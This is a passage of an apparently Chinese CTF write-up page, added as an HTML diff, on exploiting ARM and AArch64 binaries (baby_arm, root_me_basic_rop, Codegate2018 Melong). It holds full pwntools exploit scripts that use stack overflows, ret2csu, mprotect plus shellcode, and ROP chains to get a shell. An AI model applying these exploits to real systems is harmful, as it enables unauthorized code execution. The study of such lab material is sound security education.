+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;./typo&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="c1">#p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./typo&quot;])</span>
+    <span class="c1">#p = process([&#39;qemu-arm&#39;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;])</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;qemu-arm&#39;</span><span class="p">,</span><span class="s2">&quot;./typo&quot;</span><span class="p">])</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./typo&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">pop_r0_r4_pc</span> <span class="o">=</span> <span class="mh">0x00020904</span>
+<span class="n">str_binsh</span> <span class="o">=</span> <span class="mh">0x0006c384</span>
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x000110B4</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">112</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r0_r4_pc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">str_binsh</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;quit&quot;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="c1"># p.sendline(&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="2018-baby_arm">2018 上海市大学生网络安全大赛 - baby_arm<a class="headerlink" href="#2018-baby_arm" title="Permanent link">&para;</a></h2>
+<h3 id="_23">基本情况<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<p>Aarch64 架构只打开 nx 保护，是个动态连接的程序，qemu 启动要用 -L 指定运行库：<code>qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</code></p>
+<p><img alt="image-20210122121112367" src="../_images/arm/image-20210122121112367.png" /></p>
+<p>程序一共两次输入，第一次是输入到 bss 段，第二次存在栈溢出。</p>
+<p>看一看栈溢出部分汇编，aarch64 栈分布与 x86 有点不一样：</p>
+<div class="highlight"><pre><span></span><code>var_50          = -0x50
+STP             X29, X30, [SP,#var_50]!;压栈将x29x30压入sp-0x50，之后将sp更新为sp-0x50
+MOV             X29, SP;新栈基地址
+ADD             X0, X29, #0x10;x0=x29-0x10
+MOV             X2, #0x200 ; nbytes
+MOV             X1, X0  ; buf
+MOV             W0, #0  ; fd
+BL              .read
+NOP
+LDP             X29, X30, [SP+0x50+var_50],#0x50;出栈
+RET
+</code></pre></div>
+<p>这里栈溢出的话不能修改 sub_4007F0 的 rip ，修改的是上层函数的返回地址。利用 mprotect 给 bss 写入位置加上运行权限。mprotect 需要 3 个参数，对应 x0-x3 寄存器，ROPgadget 没有找到合适的。</p>
+<h3 id="ret2csu">ret2csu<a class="headerlink" href="#ret2csu" title="Permanent link">&para;</a></h3>
+<p>在 start 函数中找到 init 函数：</p>
+<p><img alt="image-20210122140550188" src="../_images/arm/image-20210122140550188.png" /></p>
+<p>结构体和 x86 的差不多：</p>
+<p><img alt="image-20210122141146030" src="../_images/arm/image-20210122141146030.png" /></p>
+<p><img alt="image-20210122141034176" src="../_images/arm/image-20210122141034176.png" /></p>
+<p>0x4008CC 开始从栈上提取值到寄存器，读懂寻址方式就行。栈溢出填充变量后马上调用 0x4008CC 变量在内存布局如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">内存地址</th>
+<th align="center">内存布局</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">低</td>
+<td align="center">……</td>
+<td>padding</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">……</td>
+<td>Rbp</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">0x4008CC</td>
+<td>Rip</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X29</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X30</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X19</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X20</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X21</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X22</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X23</td>
+<td></td>
+</tr>
+<tr>
+<td align="center">高</td>
+<td align="center">X24</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>然后就是 0x4008AC 给参数寄存器赋值并调用函数：</p>
+<div class="highlight"><pre><span></span><code>LDR             X3, [X21,X19,LSL#3]
+MOV             X2, X22
+MOV             X1, X23
+MOV             W0, W24
+ADD             X19, X19, #1
+BLR             X3
+CMP             X19, X20
+B.NE            loc_4008AC
+</code></pre></div>
+<ol>
+<li>
+<p>执行<code>LDR X3,[X21,X19,LSL#3]</code>，那么此句汇编的意义是，将X19的值逻辑左移(Logical Shift Left)三位后加上X21的值，**取其所指向的值**存储在X3寄存器中。控制 x19 为 0 ，就变成 <code>LDR X3,[X21]</code> 。</p>
+</li>
+<li>
+<p>把 X22 寄存器的值作为第三个参数 x2 ；把 X23 寄存器的值作为第二个参数 x1 ；把 X24 寄存器的值（低32位）作为第一个参数 x0 ；</p>
+</li>
+<li>
+<p>给 X19 寄存器的值加一，调用 X3 寄存器**所指向**的函数，也就需要找个已知地址的地方写入 plt 。</p>
+</li>
+<li>比较 x19 和 x20 ，不相等就再次调用 0x4008AC ，所用 x20 控制为 1 。</li>
+</ol>
+<p>最后得出对照表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">内存地址</th>
+<th align="center">内存布局</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">低</td>
+<td align="center">……</td>
+<td>padding</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">……</td>
+<td>Rbp</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">0x4008CC</td>
+<td>Rip</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X29</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X30</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X19</td>
+<td>固定值：0</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X20</td>
+<td>固定值：1</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X21</td>
+<td>存储调用函数地址：X3</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X22</td>
+<td>第三个参数：X2</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">X23</td>
+<td>第二个参数：X1</td>
+</tr>
+<tr>
+<td align="center">高</td>
+<td align="center">X24</td>
+<td>第一个参数：W0(X0低32位)</td>
+</tr>
+</tbody>
+</table>
+<p>修改完权限之后还需要调用在 bss 段上的 shellcode ，就在上面 payload 上再加调用就行了，得出最后的 payload ：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>              <span class="c1"># X19</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4008CC</span><span class="p">)</span>                <span class="c1"># X20</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>               <span class="c1"># X29</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4008AC</span><span class="p">)</span>                 <span class="c1"># X30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>               <span class="c1"># X19 , X20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411068</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span>         <span class="c1"># X21</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>                      <span class="c1"># X22</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>                   <span class="c1"># X23</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411000</span><span class="p">)</span>                 <span class="c1"># X24</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>               <span class="c1"># X29</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411068</span><span class="p">)</span>                 <span class="c1"># X30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x6</span>                  <span class="c1"># X19 - X24</span>
+</code></pre></div>
+<h3 id="exp_1">EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./pwn&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-aarch64&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/aarch64-linux-gnu&quot;</span><span class="p">,</span> <span class="s2">&quot;./pwn&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-aarch64&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/aarch64-linux-gnu&quot;</span><span class="p">,</span> <span class="s2">&quot;./pwn&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/aarch64-linux-gnu/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">shell_code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">shell_code</span> <span class="o">=</span> <span class="n">shell_code</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">shell_code</span> <span class="o">=</span> <span class="n">shell_code</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">])</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>              <span class="c1"># X19</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4008CC</span><span class="p">)</span>                <span class="c1"># X20</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>               <span class="c1"># X29</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4008AC</span><span class="p">)</span>                 <span class="c1"># X30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>               <span class="c1"># X19 , X20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411068</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span>         <span class="c1"># X21</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>                      <span class="c1"># X22</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>                   <span class="c1"># X23</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411000</span><span class="p">)</span>                 <span class="c1"># X24</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>               <span class="c1"># X29</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411068</span><span class="p">)</span>                 <span class="c1"># X30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x6</span>                  <span class="c1"># X19 - X24</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Name:&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shell_code</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="root_me_basic_rop">root_me_basic_rop<a class="headerlink" href="#root_me_basic_rop" title="Permanent link">&para;</a></h2>
+<h3 id="_24">基本情况<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<p>32 位 arm 架构动态链接程序，打开 nx 保护。存在 scanf 函数栈溢出漏洞。通过调试测试得出溢出 0x44 后，就能控制 pc 寄存器。</p>
+<p><img alt="image-20210124201022270" src="../_images/arm/image-20210124201022270.png" /></p>
+<p>程序中有后门函数：</p>
+<p><img alt="image-20210124201322884" src="../_images/arm/image-20210124201322884.png" /></p>
+<p>ROPgadget 查询如下：</p>
+<div class="highlight"><pre><span></span><code>Gadgets information
+============================================================
+0x00010634 : pop {fp, pc}
+0x0001055c : pop {r0, r1, r4, r8, fp, ip, sp, pc}
+0x000103f8 : pop {r3, pc}
+0x000105b0 : pop {r4, fp, pc}
+
+Unique gadgets found: 4
+</code></pre></div>
+<p>结合 main 函数中 scanf 附件汇编指令，利用 pop_r3_pc 这个 gadget 可以控制 scanf 实现任意地址写。</p>
+<p><img alt="image-20210124203121632" src="../_images/arm/image-20210124203121632.png" /></p>
+<p>程序中现成有 system ，这里就向 bss 写入 <code>/bin/sh\x00</code> 作为参数调用。然后就是控制 r0 的值，先用 gadget 控制 r3 的值，接着将程序控制到 <code>0x1067c</code> 从而控制 r0 。</p>
+<p>程序劫持到 <code>0x1067c</code> 之后就会一直执行下去，遇到 <code>0x10684</code> 的话就会从 r11 上取值给 pc 而不是用 bss 段上的数据，所以这里还需要提前向 r11 写入一个存储着 exec 函数地址的地址，这个在写入 bss 时一起实现。两段 payload 分别是：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">padding</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># R3:write address</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_scanf</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">])</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+</code></pre></div>
+<p>实际调试时发现 exec 前面几条函数会覆盖 <code>/bin/sh\x00</code> 前面的四个字节，不过问题不大，将其修改为 <code>xxxx;sh\x00</code> 即可。</p>
+<h3 id="exp_2">EXP<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="mh">0x000103f8</span>
+<span class="n">pop_r11_pc</span> <span class="o">=</span> <span class="mh">0x00010634</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="mh">0x44</span>
+<span class="n">main_scanf</span> <span class="o">=</span> <span class="mh">0x0001065C</span>
+
+<span class="c1">#payload1 = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">padding</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># R3:write address</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_scanf</span><span class="p">)</span>         
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bss:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bss:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]))</span>
+
+<span class="c1"># payload2 = &quot;/bin;sh\x00&quot; + p32(elf.sym[&#39;exec&#39;])</span>
+<span class="c1"># payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)</span>
+<span class="c1"># payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s2">&quot;skye;sh</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">])</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r11_pc</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="codegate2018_melong">Codegate2018_Melong<a class="headerlink" href="#codegate2018_melong" title="Permanent link">&para;</a></h2>
+<ol>
+<li>分析压栈变量个数</li>
+<li>分析rop返回位置</li>
+<li>libc静态加载特性</li>
+</ol>
+<h3 id="_25">基本情况<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<p>32位ARM动态链接程序，仅开启NX保护。</p>
+<p>程序是一个 BMI 计算器，在 write_diary(len, addr); 存在栈溢出，长度实际上是经过 PT 函数计算 check 函数输入的身高体重数据后，得出的 BMI 指数，addr 对应是 main 函数中的局部变量。</p>
+<p>PT 函数挺奇特的，如果需要控制返回值为输入的 size 就需要满足 if 条件。exc2 一直都没有赋值为 0 ，所以需要利用 malloc 申请失败返回 null 。因此这里输入 -1 ，将返回值设置为 -1 。</p>
+<p><img alt="image-20210123003225618" src="../_images/arm/image-20210123003225618.png" /></p>
+<p>在 PT 中 size 数据类型为 size_t ，在 write_diary 用 unsigned int 存储原本 -1 变成非常大的数，造成栈溢出。</p>
+<p><img alt="image-20210123003805545" src="../_images/arm/image-20210123003805545.png" /></p>
+<h3 id="_26">思路<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<p>和 x86 架构下 ret2libc 的思路一样，只是不同架构 payload 需要调整。</p>
+<p>padding 长度和 x86 一样，可以在 ida 中看出来是 50+4 ：</p>
+<p><img alt="image-20210123004311891" src="../_images/arm/image-20210123004311891.png" /></p>
+<p><strong>注意在 arm 程序没有 ebp 这个位置的填充</strong>，具体可以从汇编分析得出：</p>
+<div class="highlight"><pre><span></span><code>PUSH    {R11,LR};将R11+LR指向的内容压栈
+ADD     R11, SP, #4;
+SUB     SP, SP, #0x50;栈顶向低地址移动0x50
+LDR     R3, =stdin__GLIBC_2.4;函数体开始
+……
+</code></pre></div>
+<p>只有 R11 一个寄存器压栈了，所以 padding 应该为：50+4</p>
